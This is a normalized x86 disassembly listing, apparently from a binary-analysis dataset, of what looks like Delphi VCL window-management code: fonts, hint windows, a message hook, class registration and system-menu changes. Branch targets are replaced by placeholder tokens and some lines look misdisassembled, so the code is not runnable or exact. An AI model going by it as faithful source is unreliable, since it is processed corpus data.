jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45d9c8
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45db0d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45feb8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_420628
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_420628
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_42070c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_420628
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_420628
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_420628
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45feb8
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_42046c
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_42046c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45db14
cmp [ rw-data ] 0x0
je r-xdata
sub_45db4c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45dbac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45dce8 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45dd5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45d4b4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_417570
mov dl [ ebp - 0x1 ]
call sub_45dbac
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45d4a0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_417414
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_4175ec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_417570
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45db4c
test al al
je r-xdata
inc esi
sub_45dea8
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45d4b4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45d4a0
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_45df00
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45dea8
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45df7a
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45dd5c
pop ecx
push ebp
mov al 0x2
call sub_45dd5c
pop ecx
push ebp
mov al 0x3
call sub_45dd5c
pop ecx
push ebp
mov al 0x4
call sub_45dd5c
pop ecx
push ebp
mov al 0x5
call sub_45dd5c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
sub_45df88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45db1c
xor eax eax
push ebp
push sub_45e001
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45df00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45db24
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45e01c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404038
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_40408c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_45e074
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_45e0a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4604c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45e0c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43e528
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_46053c
sub_45e124
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45f5dc
sub_45e168
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_45e124
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_45e0c8
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45e1dc
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_45e238
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45e268
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45e290
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_45e238
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45e268
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45e268
sub_45e2d0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41d098
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45f9a8
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_427078
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_427448
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_460140
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c5e8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45fba0
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c610
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408860
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4042a8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46031c
mov eax ebx
call sub_460d30
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45e5d8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_45e4b9
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_460d40
mov [ esp + 0x4 ] esi
mov [ esp ] sub_45f9a8
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_45fba0
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_46053c
xor edx edx
mov eax esi
call sub_45feb8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
push esi
push sub_45ea0c
mov eax esi
call sub_45f794
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405928
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_4032e8
mov eax [ esi + 0x90 ]
call sub_4032e8
mov eax [ esi + 0x98 ]
call sub_4032e8
test bl bl
jle r-xdata
call sub_41e1c0
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_45e5d8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45e779
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e780
lea eax [ ebp - 0x2c ]
call sub_404038
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45eb58
call sub_41e128
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4044f8
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406d88
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404038
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45f25c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45f25c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45e788
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45d4bc
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45e7e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_417414
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4464d0
cmp ebx eax
je r-xdata
sub_45e858
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45e7e8
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_417570
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45e970
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_417570
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45ea0c
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c8b0
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45d9c8
mov eax [ rw-data ]
call sub_45e010
sub_45ea64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45eac1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eac8
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404230
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45ead0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45eb0c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45f25c
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45eb58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403788#8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
